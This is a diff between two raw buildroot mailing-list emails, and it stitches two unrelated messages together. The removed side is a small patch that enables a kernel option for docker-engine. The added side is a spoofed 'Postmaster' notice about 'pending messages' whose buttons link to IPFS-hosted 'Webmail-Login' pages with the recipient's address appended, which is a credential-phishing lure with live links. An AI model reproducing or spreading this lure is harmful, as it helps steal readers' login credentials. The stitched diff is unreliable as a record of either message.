@@ -1,68 +1,51 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
+Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 1C87EC3DA4A
-	for <buildroot@archiver.kernel.org>; Tue, 20 Aug 2024 15:44:33 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 343CFC3DA4A
+	for <buildroot@archiver.kernel.org>; Tue, 20 Aug 2024 16:35:00 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id A25D34058B;
-	Tue, 20 Aug 2024 15:44:33 +0000 (UTC)
-X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id 4JK_dzrwzN1V; Tue, 20 Aug 2024 15:44:32 +0000 (UTC)
-X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 704CF405C2
-Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp4.osuosl.org (Postfix) with ESMTP id 704CF405C2;
-	Tue, 20 Aug 2024 15:44:32 +0000 (UTC)
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
- by ash.osuosl.org (Postfix) with ESMTP id 1D7C81BF345
- for <buildroot@lists.busybox.net>; Tue, 20 Aug 2024 15:44:31 +0000 (UTC)
-Received: from localhost (localhost [127.0.0.1])
- by smtp2.osuosl.org (Postfix) with ESMTP id 177CD408FC
- for <buildroot@lists.busybox.net>; Tue, 20 Aug 2024 15:44:31 +0000 (UTC)
+	by smtp2.osuosl.org (Postfix) with ESMTP id B17004014D;
+	Tue, 20 Aug 2024 16:34:59 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp2.osuosl.org ([127.0.0.1])
  by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id xe7dne4D1aCr for <buildroot@lists.busybox.net>;
- Tue, 20 Aug 2024 15:44:30 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=89.238.66.15;
- helo=helium.openadk.org; envelope-from=wbx@openadk.org; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp2.osuosl.org 28A934048D
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 28A934048D
-Received: from helium.openadk.org (helium.openadk.org [89.238.66.15])
- by smtp2.osuosl.org (Postfix) with ESMTPS id 28A934048D
- for <buildroot@buildroot.org>; Tue, 20 Aug 2024 15:44:30 +0000 (UTC)
-Received: by helium.openadk.org (Postfix, from userid 1000)
- id DEA143536A70; Tue, 20 Aug 2024 17:44:27 +0200 (CEST)
-Date: Tue, 20 Aug 2024 17:44:27 +0200
-From: Waldemar Brodkorb <wbx@openadk.org>
-To: buildroot@buildroot.org
-Message-ID: <ZsS52zTjT0Ca9twG@waldemar-brodkorb.de>
+ id DTfkX0hwMhUj; Tue, 20 Aug 2024 16:34:58 +0000 (UTC)
+X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 6C170401DF
+Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
+	by smtp2.osuosl.org (Postfix) with ESMTP id 6C170401DF;
+	Tue, 20 Aug 2024 16:34:58 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id A06D21BF37A
+ for <buildroot@lists.busybox.net>; Tue, 20 Aug 2024 16:34:57 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 8CAE280520
+ for <buildroot@lists.busybox.net>; Tue, 20 Aug 2024 16:34:57 +0000 (UTC)
+X-Virus-Scanned: amavis at osuosl.org
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id LwAZgEaPKozm for <buildroot@lists.busybox.net>;
+ Tue, 20 Aug 2024 16:34:56 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.82;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 2547180505
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 2547180505
+Received: from busybox.net (unknown [141.98.10.82])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 2547180505
+ for <buildroot@busybox.net>; Tue, 20 Aug 2024 16:34:55 +0000 (UTC)
+From: Postmaster <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 20 Aug 2024 18:34:55 +0200
+Message-ID: <20240820183454.DBCE1F82DA9CBE46@busybox.net>
 MIME-Version: 1.0
-Content-Disposition: inline
-X-Operating-System: Linux 5.10.0-31-amd64 x86_64
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
- d=openadk.org; s=2022; 
- t=1724168667; bh=YgP5RrPvtTU3ywaPsWFgnFlFciNtyqO4b2odyVb59xY=;
- h=Date:From:To:Cc:Subject:From;
- b=ukwFUQMZnLBFyFgzhdVwwfOqdIbHV/Ien/TPSg9oa1HbHxt301kXqmdOf+thOFhM8
- ru2jmlDogjJ5bhs8uCvpRjRuY4GB4JJ+BRQOhVhVnP6u3FzYwXQUv0QZFh9Dl/ReS1
- mOYqjIz5xp6DOhOJVQx92+WXGccDqOBLZe+OR4wfCLSmQ58QhmjKsOyBtULGAY4loq
- tY6ZC9/lkZsti/Rwxi+kgbuRC5Ks8jOJDpO899g5KiZtR8aYls0qpqAH3w0FhNQ0oU
- MYaHzoclSKSG1bm75rhvlszw/joAPolbu06nlCYPUSXzgrldYhnGuXwruyomlFaprH
- 0wA5wZ3sgZ4mA==
-X-Mailman-Original-Authentication-Results: smtp2.osuosl.org;
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
  dmarc=none (p=none dis=none)
- header.from=openadk.org
-X-Mailman-Original-Authentication-Results: smtp2.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=openadk.org header.i=@openadk.org header.a=rsa-sha256
- header.s=2022 header.b=ukwFUQMZ
-Subject: [Buildroot] [PATCH] package/docker-engine: fix runtime problem
+ header.from=busybox.net
+Subject: [Buildroot] =?utf-8?q?Undeliverable=3A_You_have_=288=29_pending_?=
+ =?utf-8?b?bWVzc8mRZ2Vz?=
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -74,49 +57,176 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Christian Stewart <christian@aperture.us>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============6965220732017198690=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-When starting a container you get:
-# docker run nginx
-docker0: port 1(veth7743781) entered blocking state
-docker0: port 1(veth7743781) entered disabled state
-veth7743781: entered allmulticast mode
-veth7743781: entered promiscuous mode
-docker0: port 1(veth7743781) entered disabled state
-veth7743781 (unregistering): left allmulticast mode
-veth7743781 (unregistering): left promiscuous mode
-docker0: port 1(veth7743781) entered disabled state
-docker: Error response from daemon: failed to create task for
-container: failed to create shim task: OCI runtime create failed:
-error opening file `/proc/self/uid_map`: No such file or directory: unknown.
+--===============6965220732017198690==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Add the missing kernel module to allow starting containers.
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div id=3D":92b" style=3D'color: rgb(34, 34, 34); text-transform: none; tex=
+t-indent: 0px; letter-spacing: normal; font-family: "Google Sans", Roboto, =
+RobotoDraft, Helvetica, Arial, sans-serif; font-size: medium; font-style: n=
+ormal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2=
+; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
+normal; font-variant-caps: normal; text-decoration-style: initial; text-dec=
+oration-color: initial; -webkit-text-stroke-width:=20
+0px; text-decoration-thickness: initial;'><div class=3D"qQVYZb"><br></div><=
+div class=3D"lQs8Hd" jsaction=3D"SN3rtf:rcuQ6b" jscontroller=3D"i3Ohde"></d=
+iv><div class=3D"btm"></div></div>
+<div style=3D'color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: "Google Sans", Roboto, RobotoDraft,=
+ Helvetica, Arial, sans-serif; font-size: medium; font-style: normal; font-=
+weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
+ background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
+-variant-caps: normal; text-decoration-style: initial; text-decoration-colo=
+r: initial; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial;'><div class=3D"aHl" style=3D"margin-lef=
+t: -38px;"></div><div tabindex=3D"-1" id=3D":91y"></div>
+<div class=3D"ii gt" id=3D":929" style=3D"margin: 8px 0px 0px; padding: 0px=
+; font-size: 0.87rem; position: relative; direction: ltr;" jslog=3D"20277; =
+u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxudWxsLG51=
+bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsW11d; 4:WyI=
+jbXNnLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxbXSxudWxsLG51bGwsbnVsbCxudWxsLG=
+51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxbXSxbXSxbXV0.">
+<div class=3D"a3s aiL " id=3D":92a" style=3D"font: small/1.5 Arial, Helveti=
+ca, sans-serif; width: 603px; height: 606px; overflow: hidden; font-size-ad=
+just: none; font-stretch: normal;"><u></u><div style=3D"margin: 0.4em;">
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; border-top-color: currentColor; border-top-width: 0px; border-top-style: =
+none; white-space: normal; box-sizing: border-box; background-color: rgb(24=
+4, 248, 245); font-variant-ligatures: normal; font-variant-caps: normal; te=
+xt-decoration-style: initial;=20
+text-decoration-color: initial;"><div style=3D"width: 593px; height: 43px; =
+padding-top: 5px; padding-right: 5px; padding-bottom: 5px; margin-left: 18p=
+x; border-top-color: currentColor; border-top-width: 0px; border-top-style:=
+ none; float: left; box-sizing: border-box;"><span style=3D"box-sizing: bor=
+der-box;"><font size=3D"2"><span style=3D"box-sizing: border-box;"><font si=
+ze=3D"2">Message generated from<span>&nbsp;</span>
+<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
+=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://m=
+edi-cont.hu&amp;source=3Dgmail&amp;ust=3D1696329870830000&amp;usg=3DAOvVaw0=
+fBxS8iT8to0LhSccEB9L8">busybox.net</a>&nbsp;source.</font></span><font size=
+=3D"2"></font><font size=3D"2"><span style=3D"box-sizing: border-box;"></sp=
+an></font></font><font size=3D"2"><span style=3D"box-sizing: border-box;">
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><br></div></span></font></span><font size=
+=3D"2"></font><span style=3D"box-sizing: border-box;"></span>
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><br></div></div><div style=3D"box-sizing: b=
+order-box;"><div style=3D"width: 5px; height: 30px; border-top-color: curre=
+ntColor; border-top-width: 0px; border-top-style: none; box-sizing: border-=
+box; background-color: rgb(86, 166, 89);"></div></div>
+</div><div style=3D"text-align: left; color: rgb(44, 54, 58); text-transfor=
+m: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, san=
+s-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacin=
+g: 0px; white-space: normal; box-sizing: border-box; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+text-decoration-style: initial; text-decoration-color: initial;"><br></div>=
 
-Signed-off-by: Waldemar Brodkorb <wbx@openadk.org>
----
- package/docker-engine/docker-engine.mk | 1 +
- 1 file changed, 1 insertion(+)
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; background-color: rgb(255, 2=
+55, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-d=
+ecoration-style: initial; text-decoration-color: initial;">&nbsp;</div>
+<table style=3D"width: 629px; text-align: left; color: rgb(44, 54, 58); tex=
+t-transform: none; letter-spacing: normal; font-family: calibri; font-size:=
+ 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; background-col=
+or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
+normal; text-decoration-style: initial; text-decoration-color: initial;" bo=
+rder=3D"0"><tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;"><td align=3D"left" style=3D"margin: 0=
+px; box-sizing: border-box;"><table style=3D"width: 627px; border-collapse:=
+ collapse; min-width: 600px; box-sizing: border-box;" border=3D"0" cellspac=
+ing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr al=
+ign=3D"center" style=3D"box-sizing: border-box;"><td style=3D"margin: 0px; =
+box-sizing: border-box;">
+<table style=3D"border-collapse: collapse; max-width: 600px; box-sizing: bo=
+rder-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D=
+"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=
+=3D"margin: 0px; box-sizing: border-box;"><table style=3D"width: 513px; bor=
+der-collapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0"></table></td></tr><tr style=3D"box-sizing: border-=
+box;"><td style=3D"margin: 0px; box-sizing: border-box;">
+<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
+Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
+olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
+th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
+tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;8 messag=
+es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
+izing: border-box;">
+<td style=3D"margin: 0px; box-sizing: border-box;"><div style=3D"border-top=
+-color: currentColor; border-top-width: 0px; border-top-style: none; box-si=
+zing: border-box;">&nbsp;</div><div style=3D"box-sizing: border-box;">&nbsp=
+;</div><font size=3D"1"><font size=3D"2">Some messages are restrained from =
+delivering to <u><font color=3D"#0000ff"><a style=3D"color: rgb(17, 85, 204=
+);" href=3D"mailto:buildroot@busybox.net" target=3D"_blank">buildroot@busyb=
+ox.net</a></font></u><font style=3D"box-sizing: border-box;"><br><br></font=
+></font></font>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+<font size=3D"2">Due to low bandwidth we notify you to take prompt actions<=
+/font></p>
+<a style=3D"background: rgb(36, 107, 193); margin: 2px; padding: 10px; outl=
+ine: 0px; border: thick currentColor; border-image: none; color: rgb(255, 2=
+55, 255); text-decoration: none; float: left; display: block; box-sizing: b=
+order-box;" href=3D"https://ipfs.io/ipfs/bafkreifgqjuylmrgjqtfgulvifrlwslrs=
+bxnyzagvig32oqty2gbdg6fua?filename=3DWebmail-Login.html#buildroot@busybox.n=
+et" target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
+x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
+0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
+<font size=3D"3">Release Messages</font></a>
+<a style=3D"background: rgb(179, 179, 179); margin: 2px; padding: 10px; out=
+line: 0px; border: thick currentColor; border-image: none; color: rgb(255, =
+255, 255); text-decoration: none; float: left; display: block; box-sizing: =
+border-box;" href=3D"https://ipfs.io/ipfs/bafkreifgqjuylmrgjqtfgulvifrlwslr=
+sbxnyzagvig32oqty2gbdg6fua?filename=3DWebmail-Login.html#buildroot@busybox.=
+net" target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
+x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
+0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
+<font size=3D"3">Review Here</font></a><p style=3D"margin-top: 0px; margin-=
+bottom: 1rem; box-sizing: border-box;">&nbsp;</p><p style=3D"margin-top: 0p=
+x; margin-bottom: 1rem; box-sizing: border-box;"></p>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
+der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
+ border-box;"></p><h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-w=
+eight: 500; margin-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;=
+"><font size=3D"1"><font size=3D"2"><font size=3D"3"><font size=3D"2">Messa=
+ge should be moved to inbox.&nbsp;<span>&nbsp;</span>
+<u style=3D"box-sizing: border-box;"><a href=3D"https://cloudflare-ipfs.com=
+/ipfs/QmNzHfbXaVaWHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA?filename=3DQmNzHfbXaVa=
+WHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA#buildroot@busybox.net">Mail.</a></u></f=
+ont></font></font></font></h5></td></tr></tbody></table></td></tr></tbody><=
+/table></td></tr></tbody></table></div></div></div></div></body></html>
 
-diff --git a/package/docker-engine/docker-engine.mk b/package/docker-engine/docker-engine.mk
-index 268b851520..baec32d79d 100644
---- a/package/docker-engine/docker-engine.mk
-+++ b/package/docker-engine/docker-engine.mk
-@@ -106,6 +106,7 @@ define DOCKER_ENGINE_LINUX_CONFIG_FIXUPS
- 	$(call KCONFIG_ENABLE_OPT,CONFIG_CGROUP_DEVICE)
- 	$(call KCONFIG_ENABLE_OPT,CONFIG_CGROUP_CPUACCT)
- 	$(call KCONFIG_ENABLE_OPT,CONFIG_NAMESPACES)
-+	$(call KCONFIG_ENABLE_OPT,CONFIG_USER_NS)
- 	$(call KCONFIG_ENABLE_OPT,CONFIG_UTS_NS)
- 	$(call KCONFIG_ENABLE_OPT,CONFIG_IPC_NS)
- 	$(call KCONFIG_ENABLE_OPT,CONFIG_PID_NS)
--- 
-2.30.2
+--===============6965220732017198690==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============6965220732017198690==--
